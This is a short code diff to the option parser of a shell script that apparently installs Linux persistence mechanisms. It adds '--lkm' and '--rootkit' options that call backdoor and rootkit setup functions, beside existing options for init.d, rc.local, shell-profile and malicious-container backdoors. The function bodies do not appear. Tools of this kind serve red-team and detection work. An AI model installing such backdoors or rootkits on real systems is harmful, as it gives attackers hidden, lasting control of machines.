@@ -92,6 +92,11 @@ main() {
 				setup_initd_backdoor "$@"
 				exit
 				;;
+			--lkm )
+				shift
+				setup_lkm_backdoor "$@"
+				exit
+				;;
 			--malicious-container )
 				shift
 				setup_malicious_docker_container "$@"
@@ -125,6 +130,11 @@ main() {
 			--rc-local )
 				shift
 				setup_rc_local_backdoor "$@"
+				exit
+				;;
+			--rootkit )
+				shift
+				setup_rootkit "$@"
 				exit
 				;;
 			--shell-profile )
